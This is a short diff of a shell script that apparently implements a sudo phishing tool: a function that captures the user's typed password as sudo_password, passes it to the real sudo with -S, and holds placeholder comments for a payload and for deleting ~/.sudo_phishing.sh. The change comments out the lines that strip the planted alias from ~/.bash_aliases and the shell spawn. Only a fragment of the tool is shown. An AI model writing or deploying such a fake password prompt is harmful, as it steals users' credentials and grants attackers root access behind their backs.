@@ -28,10 +28,10 @@ attempts() {
         # </YOUR-PAYLOAD>
         ##
         # /bin/rm ~/.sudo_phishing.sh
-        /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
-        /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
+        # /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
+        # /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
-        $BASH
+        # $BASH
         exit 0
     else 
         echo "Sorry, try again."
